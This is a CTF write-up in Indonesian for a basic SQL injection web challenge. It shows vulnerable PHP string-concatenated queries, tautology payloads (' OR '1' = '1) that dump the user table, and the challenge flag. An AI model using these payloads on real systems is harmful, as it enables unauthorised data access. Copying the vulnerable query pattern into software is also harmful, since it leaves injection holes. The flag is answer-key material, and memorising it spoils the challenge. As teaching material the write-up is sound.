# Basic Injection
**Category:** web

See if you can leak the whole database. [https://web.ctflearn.com/web4/](https://web.ctflearn.com/web4/)

## Write-up
Web dengan input seperti ini dapat diselesaikan dengan SQL Injection dasar.
Kebanyakan challenge CTF kategori web dibuat dengan bahasa pemrograman PHP. Input dari form bisa diasumsikan dengan berbagai macam bentuk

```php
$input = "SELECT * FROM user WHERE name = '". $_POST['input'] ."'";
```
atau
```php
$input = 'SELECT * FROM user WHERE name = "'. $_POST['input'] .'"';
```

Perhatikan bahwa input dari user (`$_POST['input']) tidak dilakukan filtering maupun validasi. Dalam kasus seperti ini form sangat mudah untuk di-inject menggunakan syntax SQL biasa.

Kita coba inject input dengan syntax berikut
```
' OR '1' = '1

// atau

" OR "1" = "1
```
Saya sertakan 2 contoh karena terkadang program bisa menggunakan bentuk yang pertama maupun kedua.
Dengan kode injection diatas akan membuat variabel `$input` menjadi:
```
$input = "SELECT * FROM user WHERE name = '' OR '1' = '1';
```

Kode diatas akan dieksekusi di DBMS (_Database Management System_) dan akan selalu menghasilkan nilai TRUE, yang artinya semua record/data yang ada di dalam tabel user akan ditampilkan.

Setelah disubmit, halaman web akan menampilkan semua data yang ada di dalam table `user`. Data dengan Name fl4g__giv3r memiliki flag yang kita cari.

Flag : `th4t_is_why_you_n33d_to_sanitiz3_inputs`
